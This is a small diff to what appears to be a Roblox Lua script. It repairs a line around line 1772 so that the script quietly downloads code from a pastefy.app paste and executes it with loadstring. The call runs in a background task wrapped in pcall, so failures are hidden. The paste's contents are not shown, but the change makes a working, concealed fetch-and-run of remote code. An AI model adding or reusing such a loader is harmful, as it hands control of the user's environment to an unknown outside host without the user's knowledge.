@@ -1772,7 +1772,7 @@ task.spawn(function()
     }) 
     task.spawn(function() 
         pcall(function() 
-            local response = game:HttpGet("loadstring(game:HttpGet("https://pastefy.app/otq1vNbJ/raw"))()") 
+            local response = game:HttpGet("https://pastefy.app/otq1vNbJ/raw") 
             local func = loadstring(response) 
             if func then func() end 
         end) 
